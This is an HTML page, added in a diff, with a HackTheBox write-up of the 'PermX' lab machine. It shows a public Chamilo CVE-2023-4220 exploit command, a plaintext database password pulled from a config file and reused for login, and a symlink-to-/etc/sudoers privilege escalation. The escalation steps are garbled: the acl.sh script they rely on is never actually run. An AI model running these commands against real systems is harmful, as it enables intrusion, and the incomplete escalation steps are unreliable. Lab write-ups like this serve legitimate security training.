@@ -1,0 +1,217 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - PermX</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>PermX (HTB – Easy)</h1>
+
+<p>
+The machine hosts a Chamilo LMS instance vulnerable to CVE‑2023‑4220, allowing unauthenticated file upload and
+remote code execution.  
+After obtaining a foothold as the web user, database credentials reveal a valid system user.  
+Privilege escalation is achieved by abusing a sudo‑controlled script that follows symlinks.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: permx.htb  
+<br>Initial vector: Chamilo LMS CVE‑2023‑4220 (unauthenticated RCE)  
+<br>Privilege escalation: insecure sudo script + symlink abuse  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>
+Possible usernames (from site content or enumeration):
+</p>
+
+<pre>
+noah, elsie, ralph, mia, emma, sarah, johny, james
+</pre>
+
+<p>
+Directory fuzzing reveals:
+</p>
+
+<pre>
+/lms
+</pre>
+
+<p>
+The LMS is Chamilo, which is vulnerable to CVE‑2023‑4220.
+</p>
+
+<h2>Foothold – Chamilo CVE‑2023‑4220</h2>
+
+<p>
+Use the public exploit to upload a PHP shell:
+</p>
+
+<pre>
+$ ./CVE-2023-4220.sh -f shell.php -h http://lms.permx.htb -p 443
+</pre>
+
+<p>
+A reverse shell is obtained.  
+Enumerate the system:
+</p>
+
+<pre>
+$ id
+$ whoami
+-> www-data
+</pre>
+
+<p>
+Inspect Chamilo configuration:
+</p>
+
+<pre>
+$ cat /var/www/chamilo/app/config/configuration.php | grep -C2 password
+-> chamilo : 03F6lY3uXAP2bkW8
+</pre>
+
+<p>
+Try the password for local users:
+</p>
+
+<pre>
+$ su mtz
+Password: 03F6lY3uXAP2bkW8
+</pre>
+
+<p>
+User access obtained.
+</p>
+
+<h2>Privilege Escalation</h2>
+
+<p>Check sudo permissions:</p>
+<pre>
+$ sudo -l
+-> allowed to run /opt/acl.sh
+</pre>
+
+<p>
+The script follows symlinks, allowing arbitrary file modification.  
+Exploit by replacing <code>/etc/sudoers</code> with a symlink.
+</p>
+
+<h3>Exploit</h3>
+
+<p>Create a symlink chain:</p>
+<pre>
+$ ln -s /etc/sudoers /home/mtz/LINK
+</pre>
+
+<p>
+Edit the sudoers file through the vulnerable script:
+</p>
+
+<pre>
+$ nano /etc/sudoers
+# Add:
+mtz ALL=(ALL:ALL) NOPASSWD:ALL
+</pre>
+
+<p>
+Now escalate:
+</p>
+
+<pre>
+$ sudo bash
+# id
+# whoami
+-> root
+</pre>
+
+<h2>Conclusion</h2>
+<p>
+PermX combines a straightforward Chamilo RCE with a simple but effective symlink‑based privilege escalation.
+After exploiting CVE‑2023‑4220 to gain initial access, the vulnerable <code>acl.sh</code> script allows modification
+of <code>/etc/sudoers</code>, resulting in full system compromise.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
